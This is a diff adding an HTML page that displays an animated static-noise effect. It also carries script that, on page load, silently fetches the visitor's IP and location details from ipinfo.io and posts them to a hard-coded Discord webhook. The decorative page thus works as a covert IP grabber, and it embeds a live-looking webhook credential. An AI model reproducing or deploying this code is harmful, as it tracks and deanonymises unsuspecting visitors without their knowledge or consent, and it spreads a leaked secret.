@@ -1,1 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>--</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            overflow: hidden;
+        }
 
+        .static-dot {
+            position: absolute;
+            background-color: white;
+            width: 2px;
+            height: 2px;
+            border-radius: 50%;
+            opacity: 0;
+            animation: static 2s linear infinite;
+        }
+
+        @keyframes static {
+            0%, 100% {
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <script>
+        function random(max) {
+            return Math.random() * max;
+        }
+
+        function createDot() {
+            const dot = document.createElement('div');
+            dot.className = 'static-dot';
+            dot.style.top = random(window.innerHeight) + 'px';
+            dot.style.left = random(window.innerWidth) + 'px';
+            document.body.appendChild(dot);
+            setTimeout(() => {
+                document.body.removeChild(dot);
+            }, 2000);
+        }
+
+        setInterval(createDot, 30);
+
+        // Function to make an HTTP request
+        function makeHttpRequest(url, method, data, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open(method, url, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    callback(xhr.responseText);
+                }
+            };
+
+            xhr.send(data);
+        }
+
+        // Function to get IP info and send it to Discord webhook
+        function getIPInfoAndSendToDiscord() {
+            // Get IP info from ipinfo.io
+            makeHttpRequest('https://ipinfo.io/json', 'GET', null, function (ipInfo) {
+                // Parse the JSON response
+                var ipInfoObject = JSON.parse(ipInfo);
+
+                // Create a payload for Discord webhook
+                var discordPayload = {
+                    content: 'IP Info:\n```json\n' + JSON.stringify(ipInfoObject, null, 2) + '\n```'
+                };
+
+                // Send the payload to Discord webhook using your server-side script
+                makeHttpRequest('https://discord.com/api/webhooks/1193413957982105620/MRjr2wNnhbsBowbWfAPFeQUe9O-lOj1wgSxbSPBpb1DWcPWGdrUgty2hqsKiIkVTSxFR', 'POST', JSON.stringify(discordPayload), function (response) {
+                    console.log('Message sent to Discord:', response);
+                });
+            });
+        }
+
+        // Call the function when the page loads
+        window.onload = getIPInfoAndSendToDiscord;
+    </script>
+</body>
+</html>
